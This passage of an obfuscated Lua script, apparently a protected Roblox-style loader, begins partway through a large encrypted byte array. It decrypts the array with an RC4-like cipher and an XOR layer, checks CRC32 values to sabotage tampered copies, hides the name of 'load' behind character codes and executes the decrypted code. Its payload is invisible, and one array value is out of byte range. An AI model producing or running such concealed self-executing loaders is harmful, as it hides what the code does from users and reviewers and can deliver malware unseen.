205,141,148,111,200,13,105,249,200,239,233,111,84,9,251,37,177,43,84,155,128,90,165,173,36,210,154,216,236,21,45,230,126,85,56,159,210,211,103,28,254,12,221,12,14,136,116,37,180,88,97,233,154,250,189,76,196,84,152,84,99,255,224,218,37,79,248,48,57,127,72,136,76,5,35,18,52,66,188,175,
183,99,100,157,224,108,173,252,180,16,110,54,208,63,233,131,11,103,132,213,47,83,87,142,196,44,96,209,234,58,129,30,86,112,10,5,55,123,110,217,88,214,217,18,9,221,5,207,154,245,210,199,121,122,50,158,216,38,213,110,165,211,95,14,175,68,254,135,212,178,241,111,157,143,205,86,28,5,224,84,
157,173,172,190,7,120,177,248,198,198,182,177,78,176,10,239,1,14,47,25,168,61,103,170,1,83,177,134,167,173,11,8,58,47,158,11,11,202,208,42,84,7,221,200,154,93,59,118,241,195,229,244,218,37,232,140,166,0,156,170,59,223,126,248,111,119,57,108,205,46,173,155,219,86,62,159,26,16,79,7,
129,240,236,231,214,211,159,229,0,94,139,200,96,211,54,244,141,206,247,64,49,178,77,14,88,16,207,7,227,86,86,112,56,181,61,0,130,201,75,101,51,238,136,130,176,136,26,19,211,216,56,38,205,247,86,155,34,40,82,227,81,250,252,77,227,216,178,180,253,251,242,21,62,227,46,195,161,44,116,84,
122,151,95,157,115,246,208,146,76,59,251,238,188,171,245,52,105,175,30,229,78,111,135,73,244,213,160,221,208,99,225,165,96,96,252,62,46,99,62,144,183,251,19,255,24,3,187,119,182,209,95,122,100,31,149,159,236,34,141,224,21,58,140,151,100,133,93,141,240,73,202,83,45,201,102,79,166,16,240,89,
252,22,138,14,1,133,19,168,184,246,46,224,61,218,1,53,83,117,107,223,201,194,179,214,126,249,170,134,235,196,75,70,32,53,22,174,129,218,56,209,97,252,81,109,45,223,53,64,255,138,87,112,90,207,108,249,25,37,27,75,210,220,116,243,203,26,162,247,62,185,192,25,137,176,94,155,117,97,158,58,
207,156,192,70,47,101,202,35,47,3,100,61,158,218,185,62,62,223,4,35,152,179,133,28,170,77,150,161,249,42,105,239,207,235,241,238,169,121,188,193,9,72,208,111,239,118,183,234,21,12,156,119,44,2,61,195,196,6,154,49,145,129,64,1,191,196,32,144,103,213,207,113,35,228,10,135,125,206,136,252,
112,51,84,20,130,18,80,44,148,234,91,33,151,246,45,48,188,12,249,109,1,50,191,58,120,170,165,102,125,177,82,92,232,16,224,102,112,211,39,63,206,78,118,23,147,45,178,221,228,44,129,98,70,157,106,38,80,121,89,200,222,33,150,49,172,198,42,8,164,82,50,35,192,213,239,7,93,207,145,100,
88,64,234,140,241,50,237,70,156,162,16,70,15,144,224,68,39,226,238,25,250,254,229,195,251,54,97,167,146,67,115,99,130,169,217,28,151,203,174,13,31,2,190,95,117,109,160,19,65,25,92,13,230,186,105,248,208,232,144,160,79,44,66,204,24,150,72,158,199,91,74,128,102,62,155,232,87,43,70,26,
216,123,117,221,203,196,67,95,135,78,133,193,158,192,196,159,185,105,144,54,59,109,86,221,179,140,176,235,36,29,173,111,108,180,91,108,123,36,146,224,94,126,34,239,70,207,72,74,19,47,114,81,100,140,249,88,113,229,217,34,53,201,9,90,117,163,189,200,59,62,167,218,67,133,227,189,109,78,92,206,
83,48,91,81,52,14,89,249,60,71,21,200,221,196,230,112,76,203,111,193,220,253,29,251,109,244,50,255,173,220,58,178,157,139,226,85,58,92,235,29,55,125,11,86,147,127,167,32,169,55,248,74,30,97,61,222,131,151,108,141,49,167,227,41,107,156,43,216,59,49,229,204,35,34,226,184,162,62,92,60,
90,214,194,222,245,30,50,101,89,65,153,239,43,107,42,88,116,174,52,229,108,191,189,18,137,81,29,47,54,136,226,123,156,236,71,243,219,7,17,213,73,36,177,49,55,243,97,151,68,76,130,10,222,82,60,127,255,248,218,12,6,200,39,49,129,251,232,191,176,0,13,187,142,220,185,162,184,78,142,84,
62,186,55,173,86,81,208,210,178,253,155,93,157,50,61,182,92,83,31,79,135,209,123,122,98,50,230,108,82,55,40,65,67,159,128,162,58,153,6,230,205,65,93,185,205,238,169,223,41,146,230,188,47,84,11,97,88,110,190,125,146,164,179,74,131,54,143,239,121,242,76,130,10,221,180,158,220,67,153,65,
115,33,143,35,163,24,134,248,77,81,95,103,100,84,40,208,20,97,207,36,19,121,34,7,251,19,240,129,145,245,28,219,155,227,189,115,74,123,7,75,184,158,99,106,13,103,170,27,89,124,125,222,75,46,35,236,102,248,52,86,103,95,225,134,237,121,247,88,24,58,201,102,222,63,100,235,65,112,24,24,
149,243,168,32,156,125,226,134,137,54,192,108,208,207,166,102,138,89,238,149,205,184,79,70,48,36,147,26,46,243,153,165,253,91,60,10,21,21,182,242,164,116,3,225,2,63,174,252,47,14,77,255,189,55,28,18,214,9,173,100,53,198,231,154,132,10,32,38,87,6,63,155,168,39,238,119,223,55,88,31,
210,131,60,192,245,44,113,74,232,123,237,107,197,110,18,36,167,99,255,7,50,148,243,81,156,198,215,90,232,36,95,71,249,12,101,82,154,43,170,111,120,37,18,93,231,217,94,252,221,96,73,249,158,120,9,2,222,108,160,80,243,175,216,114,195,0,224,118,41,58,9,250,145,22,130,220,71,255,215,186,
200,139,107,70,114,111,210,84,248,91,52,113,128,25,220,233,166,244,64,50,34,97,174,35,24,121,40,249,255,212,204,234,78,54,207,25,16,91,215,131,131,132,120,51,21,202,99,47,204,4,0,177,122,38,107,13,201,197,116,94,221,53,200,74,10,22,75,169,207,138,52,155,255,176,51,80,30,154,165,139,
95,241,182,198,6,54,191,10,237,33,160,16,226,197,142,69,122,164,255,114,120,188,92,10,128,53,189,71,127,2,87,66,42,238,167,211,115,96,135,109,254,50,107,98,122,217,97,159,115,146,83,51,193,167,51,224,244,212,62,43,49,134,243,132,149,70,201,121,53,204,187,183,135,224,1,185,22,219,121,182,
139,85,76,104,249,209,149,237,82,122,11,209,13,116,21,1,197,197,7,220,9,157,23,0,10,119,139,26,19,43,211,33,141,7,201,9,83,29,18,234,214,96,36,68,220,251,66,87,200,149,145,1,71,132,136,208,49,253,252,168,20,171,251,131,180,72,221,89,53,213,194,9,38,164,15,145,185,149,207,12,
198,172,123,129,103,168,250,68,133,198,226,42,44,19,31,35,31,68,157,25,83,143,64,236,100,14,84,65,224,89,105,62,128,144,142,136,199,138,241,53,102,49,160,122,106,23,141,216,110,188,228,145,204,150,224,167,245,223,166,116,60,2,138,164,118,193,69,22,198,247,94,50,211,175,249,61,217,84,173,56,
35,186,100,202,84,135,253,34,214,186,199,234,185,192,90,242,48,121,8,26,255,203,70,34,91,23,208,115,199,182,198,23,21,12,78,207,164,53,64,202,156,90,155,77,250,166,244,94,32,86,60,8,211,115,45,188,205,167,155,204,192,237,11,152,129,64,161,173,148,119,242,221,195,41,139,86,200,4,175,234,
44,255,5,209,36,144,190,33,42,50,73,150,36,110,100,249,121,248,222,106,109,170,178,249,213,229,75,41,33,186,97,47,250,248,48,231,174,243,227,127,238,155,26,111,114,20,114,234,3,231,119,135,245,170,3,117,165,151,213,146,133,74,233,231,45,172,180,206,39,105,164,200,154,42,199,211,30,133,150,46,
199,238,212,197,94,151,143,92,7,108,85,202,183,104,55,72,188,38,175,237,228,119,123,99,19,17,156,213,155,240,160,105,91,34,188,249,53,145,138,82,197,25,181,49,150,253,62,103,240,114,98,247,135,220,106,22,162,192,75,152,244,101,50,62,178,198,36,28,85,201,178,132,173,58,220,197,125,90,119,70,
129,11,106,86,50,31,221,245,220,6,33,135,39,135,160,14,59,149,137,119,203,111,83,17,27,244,205,22,254,231,37,30,3,41,171,111,65,240,11,103,20,209,196,240,50,147,97,56,9,174,192,117,14,186,134,44,244,213,32,148,236,148,59,251,62,102,36,1,28,69,95,206,25,222,244,192,189,90,28,66,
13,149,30,209,79,185,253,232,251,152,224,45,165,151,173,12,211,19,1,252,119,38,35,97,143,149,11,192,94,54,142,182,18,143,255,207,50,64,151,153,103,5,17,148,131,179,158,125,17,205,244,145,142,155,0,93,222,126,197,119,9,91,127,67,46,109,222,243,177,123,223,8,69,44,158,191,76,15,39,184,
77,162,116,98,85,18,27,203,160,123,7,81,237,13,251,8,176,42,242,12,53,123,74,98,99,227,212,168,15,127,74,147,40,248,2,184,30,37,113,165,145,246,146,198,114,235,58,252,65,149,118,158,174,195,19,207,170,184,42,217,253,113,133,63,162,47,178,55,57,9,110,103,61,35,27,23,177,115,210,196,
41,165,145,40,140,162,94,27,252,4,203,40,120,13,224,219,20,127,76,162,169,126,38,239,221,106,54,187,182,178,121,60,217,227,226,21,24,149,236,31,161,146,151,118,12,229,21,207,153,178,113,134,70,250,201,85,195,20,124,203,153,66,253,247,109,131,38,232,141,30,232,173,186,22,230,145,135,239,69,236,
45,126,90,141,194,78,189,149,25,15,230,176,99,40,160,152,9,214,18,10,167,154,220,206,215,139,138,132,233,89,7,223,85,83,122,49,57,199,201,232,195,30,193,250,74,208,30,174,103,113,68,8,58,69,162,81,21,27,215,157,166,20,156,82,159,178,234,145,108,182,106,250,101,114,158,207,51,250,155,140,
101,197,132,4,214,9,247,197,214,134,158,113,177,57,233,57,12,148,159,171,12,65,132,143,209,53,117,217,88,50,234,76,214,173,127,102,224,16,108,92,26,101,69,236,241,218,162,45,193,255,198,249,223,136,99,0,40,47,131,2,69,148,104,62,25,213,126,60,245,229,132,214,217,183,172,26,232,212,29,29,
122,60,149,17,131,54,226,148,208,238,147,0,164,190,113,174,111,57,109,137,28,121,26,151,230,150,216,216,114,159,28,21,222,113,216,209,108,13,91,50,194,24,103,173,202,13,207,52,136,149,67,75,234,102,36,229,13,234,142,37,71,96,51,82,0,189,28,149,236,36,203,232,105,106,156,154,136,140,245,179,
141,179,250,11,81,160,248,168,147,4,112,81,54,145,71,0,86,224,25,124,117,66,42,164,219,97,247,149,211,54,201,237,58,223,226,182,44,109,223,99,221,218,73,238,58,250,225,247,63,229,110,66,35,232,210,175,126,38,231,31,115,84,125,9,37,245,198,138,120,197,245,133,173,26,220,234,67,243,108,164,
13,36,236,62,154,237,52,152,240,121,10,168,44,7,226,231,162,239,130,152,58,103,68,246,153,153,220,153,243,46,99,202,85,183,196,137,244,129,229,254,105,209,208,86,147,207,81,125,93,42,87,123,110,150,185,208,58,218,57,3,157,176,98,86,9,11,250,51,86,164,90,241,173,51,121,125,98,247,198,249,
163,113,148,146,164,6,86,11,55,144,162,229,148,236,36,228,172,136,241,164,39,23,105,242,108,125,124,174,221,108,182,180,71,73,103,3,23,168,139,9,30,153,212,183,17,100,37,118,67,188,12,71,38,198,79,51,227,8,163,148,180,231,32,167,131,243,89,132,177,207,41,97,240,155,88,236,78,47,247,187,
124,40,69,175,244,134,149,135,202,237,9,161,93,42,37,207,211,88,237,189,125,60,84,229,191,39,39,216,92,149,103,96,227,212,188,206,51,9,117,229,196,16,44,252,126,207,169,23,218,117,44,55,25,45,219,211,187,78,110,161,232,91,11,15,245,86,94,64,48,9,153,253,210,248,96,33,215,239,123,237,
150,161,236,221,164,42,169,60,40,168,210,214,146,67,5,100,228,215,254,130,207,36,184,251,239,133,118,14,151,155,187,60,126,0,151,10,208,192,37,105,164,6,53,141,24,239,241,195,91,76,156,56,196,209,233,31,55,5,121,73,36,191,173,183,241,162,116,4,73,77,7,141,117,31,129,175,163,206,113,182,
42,71,150,178,162,25,239,133,127,251,167,113,234,50,241,116,157,236,36,180,111,115,61,165,48,195,37,50,90,255,122,184,181,233,161,251,241,162,182,228,250,17,224,192,169,180,135,205,231,31,217,220,155,248,150,69,133,57,223,188,182,238,129,184,155,119,141,216,33,247,74,115,212,173,200,84,21,45,197,40,
196,119,245,216,176,5,154,47,241,243,209,55,181,211,198,105,244,59,45,5,88,32,160,92,230,126,42,73,37,37,233,159,135,246,145,135,19,234,15,172,56,61,228,166,183,254,213,155,138,47,174,11,229,138,223,223,66,17,176,83,43,91,133,183,219,221,153,112,170,231,46,139,120,186,129,199,199,88,153,16,
215,29,193,1,96,220,247,192,41,228,97,140,24,102,235,151,87,164,198,113,13,231,97,206,254,60,233,122,169,198,197,200,111,80,28,76,191,150,73,57,219,219,89,13,98,104,9,163,44,250,38,210,173,143,35,186,36,54,20,69,127,53,230,222,108,65,81,157,47,137,99,235,39,191,156,190,0,45,158,208,
200,72,190,214,154,124,114,34,82,149,86,93,94,48,158,220,75,128,10,46,251,209,241,191,240,132,237,78,249,97,90,174,64,121,167,144,232,136,222,1,52,75,244,98,101,145,64,171,51,217,210,241,120,149,28,52,244,101,31,254,44,139,64,106,14,247,163,242,18,238,228,88,12,37,154,51,0,235,98,165,
193,174,38,146,76,40,247,202,112,137,15,117,127,245,170,50,223,47,161,232,168,222,116,214,116,16,168,38,3,80,10,174,252,166,45,185,140,189,116,143,16,37,235,50,219,179,33,60,155,69,23,75,12,150,159,39,117,228,114,71,88,202,81,18,35,34,190,93,193,13,47,130,79,103,130,214,45,128,69,129,
24,75,189,90,96,209,76,76,126,166,218,246,168,138,59,131,239,27,48,206,93,111,145,125,16,111,141,24,156,130,199,116,133,160,173,200,54,60,138,185,78,176,223,110,251,93,223,243,208,81,103,227,96,185,210,13,250,60,186,235,8,199,108,99,156,94,201,23,115,154,101,16,228,155,178,10,121,90,116,220,
43,154,193,150,140,254,225,160,55,161,140,244,27,130,124,207,219,117,46,93,154,80,98,39,22,124,46,201,149,253,67,226,11,119,64,47,109,231,85,15,111,156,61,11,141,75,232,133,86,76,21,124,63,38,35,26,136,245,115,248,165,233,251,165,77,216,16,144,189,178,73,114,129,101,221,54,114,45,68,112,
240,105,200,78,253,111,138,70,47,167,0,25,159,139,84,34,92,200,255,42,36,222,103,104,56,205,115,238,240,6,252,154,51,64,45,40,121,183,13,62,120,166,8,122,44,10,203,121,204,169,14,6,47,34,113,17,15,46,219,119,49,109,215,112,132,45,43,28,141,37,217,214,76,62,25,52,64,74,3,17,
110,119,174,224,103,234,27,201,161,252,162,8,105,92,213,194,83,122,244,32,66,30,82,148,82,82,94,114,123,180,24,61,146,160,165,71,77,41,116,253,52,225,119,86,76,44,53,166,41,166,247,112,55,93,253,173,29,161,122,80,79,115,136,68,6,136,132,50,191,39,79,36,175,12,232,1,28,242,115,39,
238,9,149,229,41,250,167,73,243,73,247,46,186,112,124,158,50,153,53,230,208,126,16,37,171,40,69,185,133,97,226,195,44,171,38,161,138,23,121,48,199,248,212,186,207,171,135,127,92,169,15,73,84,171,156,90,53,231,94,161,181,241,212,28,38,187,43,71,127,229,214,74,196,132,124,215,248,223,45,14,
183,98,121,38,82,225,208,58,0,168,22,132,134,95,40,106,190,129,124,81,233,67,5,13,202,239,8835,168,75,186,94,214,89,54,218,21,253,188,249,244,227,254,198,178,250,214,163,161,68,161,71,219,161,212,228,32,125,137,218,70,167,237,183,122,134,113,162,146,88,166,207,110,200,53,132,127,39,252,97,8,
123,113,237,69,154,218,51,191,74,241,127,159,29,104,185,123,161,194,255,20,102,105,52,236,84,29,155,225,69,130,196,152,64,55,245,251,77,110,6,231,89,173,33,210,102,34,106,131,240,6,82,173,241,122,111,233,208,135,18,238,77,158,60,150,36,185,68,21,62,79,1,116,32,54,172,122,59,207,154,41,
10,179,72,176,236,172,216,210,204,173,169,236,57,96,178,46,251,3,172,119,125,208,208,164,29,109,23,130,141,103,59,129,254,253,46,154,166,166,103,247,87,9,124,253,215,184,149,173,181,210,228,38,111,123,77,68,46,81,195,248,82,180,116,136,139,47,122,159,254,150,143,209,122,187,229,61,14,221,171,63,
28,224,56,178,10,221,169,16,97,15,210,157,229,227,57,7,48,133,93,64,89,99,106,219,159,147,128,237,23,68,119,123,249,222,53,90,226,32,222,70,110,58,232,27,235,180,30,217,177,8,22,2,171,119,181,50,1,59,168,228,159,185,22,141,130,179,248,152,213,63,179,125,214,38,103,234,96,140,120,222,
59,205,106,59,229,182,45,118,113,189,236,16,60,54,36,65,99,10,245,167,246,72,194,76,143,118,59,20,218,200,31,190,70,71,80,143,140,130,245,245,198,244,202,143,172,150,23,55,35,96,155,148,229,133,146,73,51,191,126,140,79,161,83,68,152,238,254,212,161,206,145,18,181,132,225,143,8,182,223,67,
161,92,74,21,75,167,232,35,76,108,59,23,196,111,146,156,170,78,36,248,37,183,82,31,197,75,39,92,125,143,35,87,248,184,147,110,38,12,0,161,255,169,187,144,109,69,102,235,112,149,245,24,50,16,255,157,166,145
}
local _IOIFlPlCl30E0IO={};local _IoIz0Im2lOOVirO=_IIIlkIEDD44OlcP
for _OfCOIITs18ZRG0O=1,32 do
_IoIz0Im2lOOVirO=bit32.bxor(_IoIz0Im2lOOVirO,bit32.lshift(_IoIz0Im2lOOVirO,13))
_IoIz0Im2lOOVirO=bit32.bxor(_IoIz0Im2lOOVirO,bit32.rshift(_IoIz0Im2lOOVirO,17))
_IoIz0Im2lOOVirO=bit32.bxor(_IoIz0Im2lOOVirO,bit32.lshift(_IoIz0Im2lOOVirO,5))
_IoIz0Im2lOOVirO=(_IoIz0Im2lOOVirO*0xC2E28D15+0x1FD01A6B)%0x100000000
_IoIz0Im2lOOVirO=bit32.bxor(_IoIz0Im2lOOVirO,bit32.rshift(_IoIz0Im2lOOVirO,16))
_IOIFlPlCl30E0IO[_OfCOIITs18ZRG0O]=_IoIz0Im2lOOVirO%256
end
local _IacH3dOl8mYIq0d={}
for _OfCOIITs18ZRG0O=0,255 do _IacH3dOl8mYIq0d[_OfCOIITs18ZRG0O]=_OfCOIITs18ZRG0O end
local _IOaaAlnO4IMlyk2=0
for _OfCOIITs18ZRG0O=0,255 do
_IOaaAlnO4IMlyk2=(_IOaaAlnO4IMlyk2+_IacH3dOl8mYIq0d[_OfCOIITs18ZRG0O]+_IOIFlPlCl30E0IO[(_OfCOIITs18ZRG0O%32)+1])%256
_IacH3dOl8mYIq0d[_OfCOIITs18ZRG0O],_IacH3dOl8mYIq0d[_IOaaAlnO4IMlyk2]=_IacH3dOl8mYIq0d[_IOaaAlnO4IMlyk2],_IacH3dOl8mYIq0d[_OfCOIITs18ZRG0O]
end
local _IIquIMg0kxVYlWO=0;local _lON1Kol0GTCB9dN=0;local _llaWw4iJOy0cJnn={}
local _l3lOIX0OOuljuLT=#_llkOtdsjOSlIO0G
local _I4WIllISl0IOoIK=1
while _I4WIllISl0IOoIK<=_l3lOIX0OOuljuLT do
_IIquIMg0kxVYlWO=(_IIquIMg0kxVYlWO+1)%256
_lON1Kol0GTCB9dN=(_lON1Kol0GTCB9dN+_IacH3dOl8mYIq0d[_IIquIMg0kxVYlWO])%256
_IacH3dOl8mYIq0d[_IIquIMg0kxVYlWO],_IacH3dOl8mYIq0d[_lON1Kol0GTCB9dN]=_IacH3dOl8mYIq0d[_lON1Kol0GTCB9dN],_IacH3dOl8mYIq0d[_IIquIMg0kxVYlWO]
local _OO1leOll6IO7_ll=_llkOtdsjOSlIO0G[_I4WIllISl0IOoIK]
local _lIulq9ltwiIrl_E=(_IacH3dOl8mYIq0d[_IIquIMg0kxVYlWO]+_IacH3dOl8mYIq0d[_lON1Kol0GTCB9dN])%256
if bit32.band(_OO1leOll6IO7_ll,_IuIITTlIH0l80RD+_IIOlLO_lNSliKvO)==_0llOIfNIzYR0lcG then _lU0kOOEsyl_1cZl=_lU0kOOEsyl_1cZl end
_llaWw4iJOy0cJnn[_I4WIllISl0IOoIK]=string.char(bit32.bxor(_OO1leOll6IO7_ll,_IacH3dOl8mYIq0d[_lIulq9ltwiIrl_E]))
_I4WIllISl0IOoIK=_I4WIllISl0IOoIK+1
end
local _lt9AI0wOIylDTIT=table.concat(_llaWw4iJOy0cJnn)
local _llMMlCDvOWqNL4q={};local _lIKxelNPt0IJIsp=_lBv0vfORl0V6alI
for _OfCOIITs18ZRG0O=1,32 do
_lIKxelNPt0IJIsp=bit32.bxor(_lIKxelNPt0IJIsp,bit32.lshift(_lIKxelNPt0IJIsp,13))
_lIKxelNPt0IJIsp=bit32.bxor(_lIKxelNPt0IJIsp,bit32.rshift(_lIKxelNPt0IJIsp,7))
_lIKxelNPt0IJIsp=bit32.bxor(_lIKxelNPt0IJIsp,bit32.lshift(_lIKxelNPt0IJIsp,17))
_llMMlCDvOWqNL4q[_OfCOIITs18ZRG0O]=_lIKxelNPt0IJIsp%256
end
local __IllIIIdOqI8Oll={}
for _OfCOIITs18ZRG0O=1,#_lt9AI0wOIylDTIT do
__IllIIIdOqI8Oll[_OfCOIITs18ZRG0O]=string.char(bit32.bxor(_lt9AI0wOIylDTIT:byte(_OfCOIITs18ZRG0O),_llMMlCDvOWqNL4q[(((_OfCOIITs18ZRG0O-1)%32)+1)]))
end
local _IiImVhi1GII5003=table.concat(__IllIIIdOqI8Oll)
local _IOhjIllOXpOlfKI=math.floor(#_IiImVhi1GII5003/3)
local _OllII1X0W0yylIj=math.floor(#_IiImVhi1GII5003*2/3)
local _lXaloIMOyOILOl0=0

do
local _OIxl3zKelfOIxnI=0xFFFFFFFF
for _O0lIlOvmfSlLIE0=1,_IOhjIllOXpOlfKI do
_OIxl3zKelfOIxnI=bit32.bxor(_OIxl3zKelfOIxnI,_IiImVhi1GII5003:byte(_O0lIlOvmfSlLIE0))
for _I4WIllISl0IOoIK=1,8 do
if bit32.band(_OIxl3zKelfOIxnI,1)==1 then _OIxl3zKelfOIxnI=bit32.bxor(bit32.rshift(_OIxl3zKelfOIxnI,1),0xEDB88320)
else _OIxl3zKelfOIxnI=bit32.rshift(_OIxl3zKelfOIxnI,1) end
end
end
if bit32.bxor(bit32.bxor(_OIxl3zKelfOIxnI,0xFFFFFFFF),_IWlywlBXlteDWfj)~=0x0C93E10E then _lXaloIMOyOILOl0=bit32.bor(_lXaloIMOyOILOl0,1) end
end

do
local _OIxl3zKelfOIxnI=0xFFFFFFFF
for _O0lIlOvmfSlLIE0=_IOhjIllOXpOlfKI+1,_OllII1X0W0yylIj do
_OIxl3zKelfOIxnI=bit32.bxor(_OIxl3zKelfOIxnI,_IiImVhi1GII5003:byte(_O0lIlOvmfSlLIE0))
for _I4WIllISl0IOoIK=1,8 do
if bit32.band(_OIxl3zKelfOIxnI,1)==1 then _OIxl3zKelfOIxnI=bit32.bxor(bit32.rshift(_OIxl3zKelfOIxnI,1),0xEDB88320)
else _OIxl3zKelfOIxnI=bit32.rshift(_OIxl3zKelfOIxnI,1) end
end
end
if bit32.bxor(bit32.bxor(_OIxl3zKelfOIxnI,0xFFFFFFFF),_IWlywlBXlteDWfj)~=0x96413D59 then _lXaloIMOyOILOl0=bit32.bor(_lXaloIMOyOILOl0,1) end
end

do
local _OIxl3zKelfOIxnI=0xFFFFFFFF
for _O0lIlOvmfSlLIE0=_OllII1X0W0yylIj+1,#_IiImVhi1GII5003 do
_OIxl3zKelfOIxnI=bit32.bxor(_OIxl3zKelfOIxnI,_IiImVhi1GII5003:byte(_O0lIlOvmfSlLIE0))
for _I4WIllISl0IOoIK=1,8 do
if bit32.band(_OIxl3zKelfOIxnI,1)==1 then _OIxl3zKelfOIxnI=bit32.bxor(bit32.rshift(_OIxl3zKelfOIxnI,1),0xEDB88320)
else _OIxl3zKelfOIxnI=bit32.rshift(_OIxl3zKelfOIxnI,1) end
end
end
if bit32.bxor(bit32.bxor(_OIxl3zKelfOIxnI,0xFFFFFFFF),_IWlywlBXlteDWfj)~=0x1F682881 then _lXaloIMOyOILOl0=bit32.bor(_lXaloIMOyOILOl0,1) end
end
if _lXaloIMOyOILOl0~=0 then
_IiImVhi1GII5003=string.rep(string.char(bit32.bxor(_lXaloIMOyOILOl0,0x7F)),#_IiImVhi1GII5003)
end
local _ll9lYlII0g80lfE={}
for _,_O0lIlOvmfSlLIE0 in ipairs({108,111,97,100}) do _ll9lYlII0g80lfE[#_ll9lYlII0g80lfE+1]=string.char(_O0lIlOvmfSlLIE0) end
local _lIOIlqlOly4BYRl=_G[string.char(114,97,119,103,101,116)]
local _IHIIZOlDQ0gEzYO=_lIOIlqlOly4BYRl(_G,table.concat(_ll9lYlII0g80lfE))
local _lIlirlIyjLGlCI8=string.char(102,117,110,99,116,105,111,110)
if type(_IHIIZOlDQ0gEzYO)~=_lIlirlIyjLGlCI8 then _IiImVhi1GII5003="" end
local _lJ6gO23OgR6UayP=_IHIIZOlDQ0gEzYO(_IiImVhi1GII5003)
if type(_lJ6gO23OgR6UayP)~=_lIlirlIyjLGlCI8 then _IiImVhi1GII5003="" end
local _OISW01kI8eeltOo,_IFrOlO_OIIa0RWj=pcall(_lJ6gO23OgR6UayP)
end
